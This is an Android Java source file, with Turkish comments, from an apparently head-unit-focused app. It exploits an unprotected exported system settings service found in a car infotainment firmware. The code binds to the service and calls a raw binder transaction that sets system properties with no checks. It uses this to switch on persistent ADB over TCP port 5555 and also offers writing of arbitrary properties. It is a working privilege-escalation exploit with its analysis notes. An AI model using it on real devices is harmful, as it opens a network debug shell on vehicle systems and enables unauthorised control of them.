package com.solutera.dilinkinspector;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.os.Parcel;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * TS Settings servisi arka kapısı (firmware 51.1.4.2605140.1 analizinden):
 *
 * com.ts.appservice.settings/.SettingsService (exported, izinsiz, android.uid.system → system_app domain)
 *   onBind → ISettingsAdapterService.Stub (descriptor: com.ts.lib.settings.ISettingsAdapterService)
 *     TRANSACTION 1 = getSettingsAdapterService(String serviceName) → IBinder
 *       serviceName="property" → IPropertySettingsServiceBinder
 *   IPropertySettingsService (descriptor: com.ts.lib.settings.property.IPropertySettingsService)
 *     TRANSACTION 10 = setSystemPersist(String key, String value) → SystemProperties.set(key, value)
 *     (Kodda hiçbir anahtar filtresi/izin denetimi yok — dexdump onTransact case 10'dan doğrulandı.)
 *
 * Hedef zincir: sys.connect.adb.wiress=1 → init.bydidc.rc:
 *   setprop service.adb.tcp.port 5555; stop adbd; start adbd  → adbd TCP 5555 dinler.
 * Kalıcılık: persist.adb.tcp.port=5555 → her açılışta adbd TCP dinler (system_app vendor prop'a yazabilir).
 */
public final class TsPropBridge {
    public static final String PKG = "com.ts.appservice.settings";
    public static final String SERVICE = "com.ts.appservice.settings.SettingsService";
    public static final String ADAPTER_DESC = "com.ts.lib.settings.ISettingsAdapterService";
    public static final String PROPERTY_DESC = "com.ts.lib.settings.property.IPropertySettingsService";

    private TsPropBridge() {}

    /** Servise bağlan, job'ı binder üzerinden çalıştır, kop. */
    static String withService(Context ctx, Job job, long timeoutMs) throws Exception {
        final CountDownLatch latch = new CountDownLatch(1);
        final IBinder[] holder = new IBinder[1];
        final Exception[] err = new Exception[1];
        ServiceConnection conn = new ServiceConnection() {
            @Override public void onServiceConnected(ComponentName name, IBinder binder) {
                holder[0] = binder;
                latch.countDown();
            }
            @Override public void onServiceDisconnected(ComponentName name) {}
        };
        Intent intent = new Intent().setComponent(new ComponentName(PKG, SERVICE));
        boolean bound;
        try {
            bound = ctx.bindService(intent, conn, Context.BIND_AUTO_CREATE);
        } catch (Exception e) {
            throw new IllegalStateException("SettingsService bind hatası: " + ScanEngine.error(e));
        }
        if (!bound) throw new IllegalStateException("SettingsService bind reddedildi (servis yok?).");
        try {
            if (!latch.await(timeoutMs, TimeUnit.MILLISECONDS))
                throw new IllegalStateException("SettingsService bağlantı zaman aşımı.");
            return job.run(holder[0]);
        } finally {
            try { ctx.unbindService(conn); } catch (Exception ignored) {}
        }
    }

    interface Job { String run(IBinder adapter) throws Exception; }

    /** ISettingsAdapterService.getSettingsAdapterService("property") → iç property binder'ı.
     *  Stub bytecode doğrulaması (ts-framework dex): case 1 = isServiceBound, case 2 = getSettingsAdapterService. */
    static IBinder getPropertyBinder(IBinder adapter) throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(ADAPTER_DESC);
            data.writeString("property");
            if (!adapter.transact(2, data, reply, 0))
                throw new IllegalStateException("getSettingsAdapterService transact başarısız.");
            reply.readException();
            IBinder inner = reply.readStrongBinder();
            if (inner == null) throw new IllegalStateException("Property binder null döndü.");
            return inner;
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    /** IPropertySettingsService.setSystemPersist(key, value) → SystemProperties.set. */
    static String setProp(IBinder prop, String key, String value) throws Exception {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(PROPERTY_DESC);
            data.writeString(key);
            data.writeString(value);
            if (!prop.transact(10, data, reply, 0))
                return "transact10 reddedildi";
            reply.readException();
            return "ok";
        } catch (Exception e) {
            return ScanEngine.error(e);
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    /** Tüm kablosuz ADB zincirini yazar: anlık tetik + kalıcı port + BYD durum bayrağı. */
    public static String enableWirelessAdb(Context ctx) throws Exception {
        return withService(ctx, adapter -> {
            IBinder prop = getPropertyBinder(adapter);
            String r1 = setProp(prop, "sys.connect.adb.wiress", "1");
            String r2 = setProp(prop, "persist.adb.tcp.port", "5555");
            String r3 = setProp(prop, "service.adb.tcp.port", "5555");
            String r4 = setProp(prop, "persist.sys.adb.wiress.enable", "true");
            return "sys.connect.adb.wiress=1 → " + r1 + "\npersist.adb.tcp.port=5555 → " + r2
                    + "\nservice.adb.tcp.port=5555 → " + r3 + "\npersist.sys.adb.wiress.enable=true → " + r4;
        }, 10000);
    }

    /** Tek bir property yazar (diagnostics için). */
    public static String setSingle(Context ctx, String key, String value) throws Exception {
        return withService(ctx, adapter -> setProp(getPropertyBinder(adapter), key, value), 10000);
    }
}
